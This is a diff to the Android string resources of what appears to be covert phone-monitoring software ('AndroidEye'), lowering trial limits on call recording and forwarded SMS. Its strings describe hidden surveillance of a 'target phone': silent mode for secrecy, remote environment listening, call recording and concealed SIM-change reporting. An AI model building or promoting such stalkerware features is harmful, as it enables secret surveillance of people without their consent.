@@ -105,7 +105,7 @@
     <string name="pref_network_mode_title">Network Connection Mode</string>
     <string name="pref_network_mode_summary">Recommend to use "Silent" or "Wi-Fi Silent" mode for secret and imperceptibility.</string>
     <string name="pref_network_mode_dlg_title">Choose Mode</string>
-    <string name="pref_record_all_time_limit_in_trial">Only 5 times recording permitted in trial.</string>
+    <string name="pref_record_all_time_limit_in_trial">Only 3 times recording permitted in trial.</string>
     <string name="pref_ring_word_title">Force Belling</string>
     <string name="pref_ring_word_summary">Send SMS #bell to force belling.</string>
     <string name="pref_env_word_title">Environment Listening</string>
@@ -153,8 +153,8 @@
     <string name="msg_auth_sms_sent_fail">ERROR: failed to send validation SMS to server. Please exit and try again or contact software support.</string>
     <string name="msg_has_sent_trial_expire_sms">AndroidEye: trial expired in %s, please contact </string>
     <string name="msg_expired_alert">Notice: Android Inspector trial expired, please contact </string>
-    <string name="msg_sms_times_over_in_trial">Notice: transferred SMS reached 10 limitation. For getting license, please contact </string>
-    <string name="msg_recording_times_over_in_trial">Notice: phone call recording reached 5 limitation. For getting license, please contact </string>
+    <string name="msg_sms_times_over_in_trial">Notice: transferred SMS reached 5 limitation. For getting license, please contact </string>
+    <string name="msg_recording_times_over_in_trial">Notice: phone call recording reached 3 limitation. For getting license, please contact </string>
     <string name="msg_changed_sim">%s changed phone card.</string>
     <string name="msg_changed_sim_new_number_workaround"> The phone number of this SMS is the new number. Please send #9#+the new number to target phone to confirm (will not display there).</string>
     <string name="msg_changed_sim_new_number"> New phone number: %s</string>
